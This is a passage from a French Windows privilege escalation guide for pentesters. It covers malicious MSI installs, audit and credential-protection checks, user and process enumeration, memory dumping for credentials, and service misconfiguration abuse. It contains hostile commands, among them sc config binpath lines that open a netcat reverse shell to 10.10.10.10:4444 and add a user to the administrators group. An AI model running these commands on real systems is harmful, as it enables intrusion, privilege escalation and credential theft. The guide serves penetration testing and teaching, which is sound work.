- Faites un clic droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantit que le payload Beacon s’exécute dès le lancement du programme d’installation.
- Dans **Custom Action Properties**, définissez **Run64Bit** sur **True**.
- Enfin, **générez le projet**.
  - Si l’avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` s’affiche, vérifiez que la plateforme est définie sur x64.

### Installation MSI

Pour exécuter l’**installation** du fichier `.msi` malveillant en **arrière-plan :**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus et détecteurs

### Paramètres d’audit

Ces paramètres déterminent ce qui est **consigné** ; vous devez donc y prêter attention.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding : il est intéressant de savoir où les journaux sont envoyés.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** est conçu pour la **gestion des mots de passe des comptes Administrator locaux**, afin de garantir que chaque mot de passe est **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne sont accessibles qu’aux utilisateurs disposant des autorisations suffisantes via les ACL, qui peuvent ainsi consulter les mots de passe des comptes admin locaux s’ils y sont autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Lorsqu’il est activé, **les mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**Plus d’informations sur WDigest sur cette page**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour l’autorité de sécurité locale (LSA) afin de **bloquer** les tentatives des processus non approuvés visant à **lire sa mémoire** ou à injecter du code, renforçant ainsi la sécurité du système.\
[**Plus d’informations sur LSA Protection ici**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les identifiants stockés sur un appareil contre des menaces telles que les attaques pass-the-hash. [**Vous trouverez ici plus d’informations sur Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Identifiants mis en cache

Les **identifiants de domaine** sont authentifiés par la **Local Security Authority** (LSA) et utilisés par les composants du système d’exploitation. Lorsque les données de connexion d’un utilisateur sont authentifiées par un package de sécurité enregistré, des identifiants de domaine sont généralement établis pour cet utilisateur.\
[**Plus d’informations sur les identifiants mis en cache ici**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Utilisateurs et groupes

### Énumérer les utilisateurs et les groupes

Vérifiez si l’un des groupes auxquels vous appartenez dispose d’autorisations intéressantes.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pouvez peut-être effectuer une élévation de privilèges**. Découvrez ici les groupes privilégiés et comment les exploiter pour effectuer une élévation de privilèges :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulation de tokens

**Pour en savoir plus** sur ce qu’est un **token**, consultez cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **découvrir les tokens intéressants** et apprendre à les exploiter :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions

```bash
qwinsta
klist sessions
```

### Dossiers personnels

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politique de mot de passe

```bash
net accounts
```

### Récupérer le contenu du presse-papiers

```bash
powershell -command "Get-Clipboard"
```

## Processus en cours d’exécution

### Permissions sur les fichiers et les dossiers

Tout d’abord, en listant les processus, **recherchez des mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d’exécution** ou si vous avez les permissions d’écriture sur le dossier du binaire afin d’exploiter d’éventuelles [**attaques DLL Hijacking**](dll-hijacking/index.html) :

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Vérifiez toujours si des [**debuggers electron/cef/chromium** sont en cours d’exécution : vous pourriez en abuser pour élever vos privilèges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Un listener de debugger peut être de courte durée ; son absence d’un instantané passif des ports ne prouve donc pas qu’il n’a jamais été exposé. Corrélez tout listener observé avec son PID, le propriétaire du processus et la capacité de l’utilisateur à faibles privilèges à y accéder ; le nom d’une application ou un indicateur de debug ne suffit pas à établir qu’une exécution de code entre utilisateurs est possible. Limitez l’énumération courante à une observation passive, sans envoyer de commandes au debugger.

**Vérification des permissions sur les binaires des processus**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Répertoires de préprocesseurs dynamiques Snort

Snort 2 peut charger des bibliothèques partagées depuis un `dynamicpreprocessor directory` déclaré dans la configuration sélectionnée avec `snort.exe -c <config>`. Pour une tâche planifiée ou un service qui exécute Snort sous un autre compte, inspectez cette configuration précise et les ACL du répertoire de modules déclaré. Si votre token peut y créer des fichiers, ce chemin mérite d’être examiné pour une éventuelle exécution de code au prochain chargement des modules par cette tâche ou ce service. Vérifiez les privilèges effectifs du compte d’exécution, la configuration active, la compatibilité des modules et les éventuelles restrictions de refus ou de partage ; un répertoire accessible en écriture ne suffit pas à établir une élévation de privilèges. La [documentation des préprocesseurs dynamiques de Snort](https://www.snort.org/documents/dpx-readme) décrit le chargement de modules à l’exécution.

### Service web privilégié avec une racine de documents accessible en écriture

Sur une installation Apache sous Windows, comparez le chemin de l’exécutable du service et son compte d’exécution au `DocumentRoot` dans son `httpd.conf` actif. Pour une installation XAMPP classique, inspectez `C:\xampp\apache\conf\httpd.conf` et les ACL de la racine de documents configurée, souvent `C:\xampp\htdocs`. Si un utilisateur moins privilégié peut créer des fichiers dans cette racine alors qu’Apache s’exécute en tant que `LocalSystem`, l’exécution de code côté serveur peut franchir la frontière de privilèges de l’hôte. Confirmez que le service est en cours d’exécution, que le chemin exact est servi et qu’un gestionnaire côté serveur traite le type de fichier ; une racine accessible en écriture prouve uniquement la possibilité de créer des fichiers. Inspectez les ACL sans écrire de fichier de test :

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Pour une installation WAMP classique, le service peut pointer vers un `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dont le chemin inclut la version (ou vers `C:\wamp\...` pour une architecture 32 bits), avec le fichier de configuration situé à côté, sous `conf\httpd.conf`, et un répertoire racine par défaut `C:\wamp64\www` ou `C:\wamp\www`. Vérifiez ensemble le chemin exact de l’exécutable du service, l’identité sous laquelle il s’exécute, le `DocumentRoot` effectif (y compris l’expansion de `${INSTALL_DIR}` et les remplacements par les hôtes virtuels) et les ACL du répertoire racine. Un répertoire WAMP accessible en écriture ne prouve pas qu’Apache s’exécute en tant que `SYSTEM` ni qu’il exécute le fichier soumis. [Apache explique comment un service Windows sélectionne sa configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Répertoire racine IIS accessible en écriture et identité réseau du pool d’applications

Pour IIS, associez un répertoire physique accessible en écriture à un **site ou une application actifs** dans `applicationHost.config`, puis identifiez le pool configuré et le gestionnaire côté serveur. Le code placé dans un répertoire servi s’exécute sous l’identité du pool uniquement si IIS traite ce type de fichier et si la route est accessible. Vérifiez les droits effectifs de l’utilisateur actuel pour créer des fichiers, l’état d’exécution du site, le gestionnaire et les remplacements propres au chemin avant de considérer un répertoire accessible en écriture comme une possibilité d’exécution de code.

La compilation dynamique ASP.NET constitue une piste distincte à examiner : les fichiers générés dans le répertoire de compilation de l’application. Par défaut, il s’agit d’un répertoire `Temporary ASP.NET Files` sous l’installation .NET Framework concernée, mais `<compilation tempDirectory>` dans l’application peut le modifier. [Microsoft documente l’emplacement et les sous-répertoires propres à chaque application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) et [recommande d’isoler les répertoires de compilation lorsque les pools d’applications ne se font pas confiance](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Si un jeton de niveau de privilège inférieur permet de modifier le code source généré dans le cache **spécifique** de l’application, déterminez si celle-ci le recompile sous une [identité de processus de travail](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) plus privilégiée. Une ACL de fichier ou de répertoire ne prouve pas à elle seule qu’il y a exécution de code : établissez la corrélation entre le cache, l’application active, le jeton et les ACL effectifs, les paramètres de compilation, l’identité du processus et le moment d’une éventuelle recompilation. Limitez-vous à l’examen des métadonnées en lecture seule ; ne déclenchez pas de compilation et ne modifiez pas les fichiers du cache pendant l’énumération.

Un pool IIS configuré avec `ApplicationPoolIdentity` ou `NetworkService` s’authentifie couramment auprès des ressources du domaine en tant que **compte de l’ordinateur hôte**, même si son jeton local est peu privilégié. `LocalSystem` est déjà hautement privilégié localement et utilise également le compte de l’ordinateur sur le réseau ; `LocalService` présente normalement des identifiants réseau anonymes. Un pool `SpecificUser` utilise le compte configuré à cet effet. [Microsoft documente ces types d’identité](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) et [l’identité réseau des pools d’applications](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Un paramètre d’identité absent peut hériter des valeurs par défaut du pool, qui varient selon les versions d’IIS ; déterminez donc la configuration effective au lieu de la déduire du nom du pool. Si l’exécution de code atteint un pool dont l’identité réseau est celle du compte de l’ordinateur, évaluez les droits d’annuaire de **cet ordinateur précis**. [DCSync](../active-directory-methodology/dcsync.md) nécessite des droits de réplication sur le contexte de nommage du domaine ; un ticket de compte machine ou le rôle de l’hôte ne suffit pas à les prouver. L’énumération passive doit examiner la configuration et les ACL sans téléverser de fichier, déclencher d’authentification réseau ni demander de tickets.

Pour un gestionnaire ASP.NET lisible qui démarre un processus auxiliaire, suivez toute valeur issue d’une requête à travers l’authentification, le déchiffrement, la validation et la construction de la commande. Un gestionnaire qui concatène un jeton décodé dans `ProcessStartInfo("cmd", "/c ...")` peut permettre à des métacaractères du shell de modifier la commande ; [Microsoft documente les caractères spéciaux de `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Établissez qu’un appelant non fiable peut réellement influencer la valeur décodée et atteindre le gestionnaire, puis déterminez l’identité effective du pool d’applications ou celle résultant d’une usurpation d’identité, ainsi que l’identité du processus enfant. Une ligne de code source lisible, un écouteur localhost ou une faiblesse dans le format du jeton ne prouvent pas, à eux seuls, qu’une commande privilégiée peut être exécutée. Examinez le code source et la configuration du pool sans envoyer de requêtes falsifiées ni exécuter le processus auxiliaire pendant l’énumération passive.

Pour un service PHP sous Windows, un chemin contrôlé par la requête et transmis à [`include` ou `require`](https://www.php.net/manual/en/function.include.php) peut évaluer un fichier PHP modifiable par un utilisateur de niveau inférieur sous l’identité du processus de travail. Confirmez que la requête peut atteindre cette instruction, que le chemin résolu désigne un fichier modifiable par l’utilisateur de niveau inférieur et lisible par le processus de travail, que les restrictions PHP applicables aux chemins autorisent l’inclusion et que le processus de travail s’exécute effectivement avec des privilèges plus élevés. Un écouteur loopback ou un fichier accessible en écriture ne suffit pas à établir cette chaîne ; examinez le code source, l’identité du service et les ACL des fichiers sans appeler le point de terminaison pendant l’énumération passive.

### Extraction de mots de passe en mémoire

Vous pouvez créer un dump mémoire d’un processus en cours d’exécution à l’aide de **procdump** de sysinternals. Les services comme FTP ont leurs **identifiants en clair en mémoire** ; essayez de dumper la mémoire et de lire les identifiants.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Applications GUI non sécurisées

**Les applications exécutées en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD ou de parcourir des répertoires.**

Exemple : « Aide et support Windows » (Windows + F1), recherchez « invite de commandes », puis cliquez sur « Cliquer pour ouvrir l’invite de commandes »

### Import de fichiers de projet avec privilèges

Une application qui ouvre automatiquement des projets depuis un répertoire de dépôt où un utilisateur moins privilégié peut écrire franchit une frontière de confiance des entrées sous le compte de l’importateur. Examinez le **chemin exact où il est possible d’écrire**, le processus ou la tâche qui l’ouvre, son identité effective et la version du parseur. Un [ancien problème d’ouverture/restauration de projets Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) permettait d’utiliser des entités externes XML dans les métadonnées du projet ; sous Windows, une entité réseau pouvait provoquer une authentification depuis le compte qui importait le projet si la [stratégie de sortie SMB et NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) l’autorisait. Il s’agit d’une piste d’exposition d’identifiants, et non d’un accès immédiat à un compte administrateur : la réponse doit pouvoir être exploitée par un autre chemin autorisé ou vulnérable, et les versions actuelles doivent être évaluées en fonction de leur état réel de mise à jour. N’ouvrez pas de projet spécialement conçu à cet effet pendant une énumération passive ; examinez le processus d’importation et les ACL.

## Services

Le droit [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sur l’objet Service Control Manager (SCM) est distinct des droits sur un service existant. Une demande d’accès en lecture seule réussie à [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) pour ce droit est une piste à examiner, et non la preuve qu’un nouveau service peut s’exécuter. [`CreateService` renvoie un handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) avec les droits d’accès au service demandés lors de sa création ; toute ouverture ultérieure du service effectue un contrôle d’accès distinct et peut échouer même si le handle d’origine pouvait être utilisé. Vérifiez séparément le jeton local ou distant effectif, les droits accordés au handle, le compte du service, la stratégie de démarrage et le chemin de l’exécutable. Ne créez ni ne démarrez de service pendant une énumération passive.

Pour un chemin d’installation de service à distance, associez ces droits SCM à un partage sur la cible sur lequel **la même ouverture de session réseau** permet d’écrire, à son ACL NTFS sous-jacente et à un chemin d’exécutable local que le compte du service peut exécuter. Un compte non administrateur peut franchir cette frontière si des droits SCM exceptionnellement étendus et un moyen de placer le fichier sont tous deux présents ; un partage administratif n’est pas une condition nécessaire. L’accès en écriture au partage seul, ou une piste indiquant qu’il est possible de créer un service via SCM, ne prouve pas que le nouveau service peut démarrer avec une identité plus privilégiée.

Un service existant peut appeler un exécutable auxiliaire au démarrage, à l’arrêt ou lors d’un autre événement du cycle de vie, même si cet exécutable ne figure pas dans son `ImagePath`. Si le nom de l’exécutable est résolu dans un répertoire où un utilisateur moins privilégié peut écrire et que le service s’exécute avec une identité plus privilégiée, un fichier auxiliaire absent peut être un candidat au remplacement, sous certaines conditions. Confirmez **le code réel du service ou l’appel documenté à l’exécutable auxiliaire**, le chemin d’exécutable résolu et l’ordre de recherche, les droits de création dans le répertoire, l’identité du service et l’existence d’un déclencheur du cycle de vie. Un répertoire de service où il est possible d’écrire ou un fichier manquant ne prouve pas à lui seul que le service charge ce fichier ; une analyse passive ne doit pas démarrer ni arrêter le service.

Pour un service existant, [`SERVICE_START` permet de fournir des arguments à `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew) ; ce droit est distinct de [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Examinez le code du service ou son interface documentée avant de considérer le droit de démarrage comme autre chose qu’un droit de contrôle. S’il utilise un argument choisi par l’appelant comme chemin de journal ou d’exportation, vérifiez l’identité du service, le cheminement exact de l’argument jusqu’à l’écriture, les restrictions de chemin et les permissions du **fichier créé**. Une écriture dans un répertoire protégé ne peut entraîner une élévation que s’il existe un autre processus privilégié ou chargeur qui accepte ce fichier ; un journal modifiable ou un droit de démarrage ne suffit pas. L’inventaire passif ne doit ni démarrer le service ni créer de fichier de test.

Pour un agent de surveillance NSClient++, un fichier `nsclient.ini` lisible constitue une **piste d’examen de configuration** : il peut contenir des identifiants Web, tandis que `boot.ini` peut rediriger la configuration vers un autre emplacement. Vérifiez le compte réel du service, l’écouteur WEB et la stratégie d’accès, ainsi que la capacité du rôle authentifié à modifier les paramètres ou les scripts. Une exécution privilégiée nécessite également `CheckExternalScripts` (ou un autre chemin d’exécution activé), un droit effectif d’enregistrer ou de modifier une commande et un déclencheur qui l’exécute sous l’identité du service. Un écouteur limité à la boucle locale peut tout de même être accessible à un utilisateur local, mais le chemin du fichier, le mot de passe ou l’écouteur ne prouvent pas à eux seuls l’existence de ces droits. Examinez les métadonnées et les permissions sans afficher de secrets ni appeler l’API Web pendant une énumération passive. Consultez la [disposition des fichiers de NSClient++](https://nsclient.org/docs/concepts/file-layout/), les [recommandations de sécurité pour le Web et les scripts](https://nsclient.org/docs/setup/securing/) et la [configuration des scripts externes](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Pour un service dont `ImagePath` est `nssm.exe`, examinez le compte d’exécution réel du service et sa valeur `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` : [NSSM y stocke l’application enfant](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), tandis que `AppDirectory` est son répertoire de travail configuré. Vérifiez l’exécutable enfant et les ACL de son répertoire parent avant de considérer que les permissions du wrapper définissent toute la frontière de sécurité du service. Un point de terminaison WCF ou SOAP local exposé par cet exécutable constitue une piste distincte à examiner : confirmez que l’utilisateur moins privilégié peut atteindre l’écouteur, que l’opération précise accepte ses entrées et que l’exécutable enfant du service effectue l’opération dangereuse avec une identité plus privilégiée. Le compte du service, une URL de point de terminaison ou un chemin modifiable ne prouvent pas à eux seuls qu’une élévation est possible ; évitez d’appeler des opérations du service pendant une énumération passive.

Pour une opération WCF personnalisée, suivez une chaîne contrôlée par l’appelant jusqu’à tout runspace PowerShell. [`Pipeline.Commands.AddScript` ajoute du texte de script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), et [`Pipeline.Invoke` exécute le pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Une [`netTcpBinding` avec des identifiants de transport Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) authentifie le client, mais l’autorisation d’appeler cette **opération précise** et l’identité effective du runspace doivent être vérifiées séparément. Un chemin allant de l’entrée d’un appelant moins privilégié à `AddScript`, sous une identité de service plus privilégiée, constitue une frontière d’exécution de code ; un port en écoute, un client authentifié ou une méthode inutilisée dans un assembly sans rapport ne sont pas des preuves suffisantes. Examinez statiquement le service déployé, son contrat, son autorisation et ses paramètres d’impersonation, sans appeler le point de terminaison pendant l’énumération.

Les déclencheurs de service (Service Triggers) permettent à Windows de démarrer un service lorsque certaines conditions sont réunies (activité sur un named pipe ou un point de terminaison RPC, événements ETW, disponibilité d’une adresse IP, connexion d’un appareil, actualisation de GPO, etc.). Même sans droits SERVICE_START, il est souvent possible de démarrer des services privilégiés en activant leurs déclencheurs. Consultez les techniques d’énumération et d’activation ici :

-
{{#ref}}
service-triggers.md
{{#endref}}

### Service de collecte de diagnostics Visual Studio

Les installations de Visual Studio dotées d’outils C/C++ peuvent inclure `VSStandardCollectorService150`, un service de diagnostic configuré pour s’exécuter en tant que `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) exploitait une jonction et une race condition sur un lien du gestionnaire d’objets pour rediriger la réinitialisation d’une DACL de service. L’élévation démontrée nécessitait également un chemin de réparation MSI utilisable du fournisseur WMI de Visual Studio Setup, ainsi que sa cible `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Le composant a été corrigé en janvier 2024.

Pour un triage passif, examinez le compte et le chemin binaire de ce service, vérifiez si le chemin du compilateur Setup WMI existe et contrôlez l’état des correctifs du composant installé. Une entrée de service, la version du produit Visual Studio ou la présence du fichier compilateur ne suffisent pas à établir que l’hôte est vulnérable. L’examen ne nécessite ni de démarrer le service ni de lancer une réparation.

Obtenir la liste des services :

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

Vous pouvez utiliser **sc** pour obtenir des informations sur un service.

```bash
sc qc <service_name>
```

Il est recommandé de disposer du binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilèges requis pour chaque service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Il est recommandé de vérifier si « Authenticated Users » peut modifier un service quelconque :

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Vous pouvez télécharger accesschk.exe pour XP ici](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous obtenez cette erreur (par exemple avec SSDPSRV) :

_Erreur système 1058._\
_Le service ne peut pas démarrer, car il est désactivé ou parce qu’aucun périphérique activé ne lui est associé._

Vous pouvez l’activer à l’aide de :

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Tenez compte du fait que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement** à ce problème consiste à exécuter :

```
sc.exe config usosvc start= auto
```

### **Modifier le chemin du binaire du service**

Dans le cas où le groupe « Authenticated users » dispose de **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier le binaire exécutable du service. Pour modifier et exécuter **sc** :

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Redémarrer le service

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Les privilèges peuvent être escaladés grâce à différentes permissions :

- **SERVICE_CHANGE_CONFIG** : permet de reconfigurer le binaire du service.
- **WRITE_DAC** : permet de reconfigurer les permissions, ce qui permet de modifier la configuration du service.
- **WRITE_OWNER** : permet de devenir propriétaire et de reconfigurer les permissions.
- **GENERIC_WRITE** : confère également la possibilité de modifier la configuration du service.
- **GENERIC_ALL** : confère également la possibilité de modifier la configuration du service.

Pour détecter et exploiter cette vulnérabilité, vous pouvez utiliser _exploit/windows/local/service_permissions_.

### Permissions faibles sur les binaires des services

Si un service s’exécute en tant que **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ou sous un compte de domaine privilégié, mais que **des utilisateurs à faibles privilèges peuvent modifier l’EXE du service ou son dossier parent**, le service peut souvent être détourné en **remplaçant le binaire et en redémarrant le service**.

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous avez des **permissions d’écriture sur le dossier** où se trouve le binaire ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez obtenir la liste des binaires exécutés par les services avec **wmic** (pas dans system32) et vérifier vos permissions avec **icacls** :

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Vous pouvez également utiliser **sc** et **icacls** :

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Recherchez les ACLs dangereuses accordées à **`Everyone`**, **`BUILTIN\Users`** ou **`Authenticated Users`**, en particulier **`(F)`**, **`(M)`** ou **`(W)`** sur l’exécutable du service ou le répertoire qui le contient. Voici une méthode d’exploitation pratique :<sup>[[27]](#references)</sup>

1. Confirmez le compte de service et le chemin de l’exécutable avec `sc qc <service_name>`.
2. Confirmez que le binaire est modifiable avec `icacls <path>`.
3. Remplacez le binaire du service par un payload ou un binaire de service malveillant valide.
4. Redémarrez le service avec `sc stop <service_name> && sc start <service_name>` (ou attendez un redémarrage ou le déclenchement du service).

Vérifications automatisées utiles :<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Si le service ne permet pas à un utilisateur standard de le redémarrer, vérifiez s’il démarre automatiquement au démarrage, s’il dispose d’une action en cas d’échec qui le relance, ou si l’application qui l’utilise peut le déclencher indirectement.

### Permissions de modification du registre des services

Vous devriez vérifier si vous pouvez modifier le registre d’un service.\
Vous pouvez **vérifier** vos **permissions** sur le **registre** d’un service en exécutant :

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Le test d’autorisation initial était formulé ainsi :

Il convient de vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** disposent des autorisations `FullControl`. Si c’est le cas, le binaire exécuté par le service peut être modifié.

Vérifiez si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** disposent d’autorisations d’écriture dans le registre sur une clé de service donnée. La présence d’une entrée ACL ne prouve pas à elle seule que l’accès est effectif : les entrées de refus, le jeton courant et les autorisations héritées sont également déterminants. Les droits sur une clé de registre sont distincts des droits `SERVICE_CHANGE_CONFIG` et `SERVICE_START` sur l’objet service. Une élévation de privilèges exige également un champ de configuration du service exploitable, un moyen de déclencher le service et une identité de service plus privilégiée. Consultez les [droits sur les clés de registre](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) de Microsoft et la [référence sur les droits d’accès aux services](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Pour modifier le Path du binaire exécuté :

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Course critique de lien symbolique de registre pour écrire une valeur HKLM arbitraire (ATConfig)

Certaines fonctionnalités d’accessibilité de Windows créent des clés **ATConfig** par utilisateur, qu’un processus **SYSTEM** copie ensuite dans une clé de session HKLM. Une **course de lien symbolique** dans le registre peut rediriger cette écriture privilégiée vers **n’importe quel chemin HKLM**, offrant une primitive d’**écriture de valeur** HKLM arbitraire.<sup>[[18]](#references)</sup>

Emplacements des clés (exemple : clavier visuel `osk`) :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` répertorie les fonctionnalités d’accessibilité installées.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stocke la configuration contrôlée par l’utilisateur.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` est créée lors de l’ouverture de session ou des transitions vers le bureau sécurisé, et l’utilisateur peut y écrire.

Déroulement de l’exploitation (CVE-2026-24291 / ATConfig) :

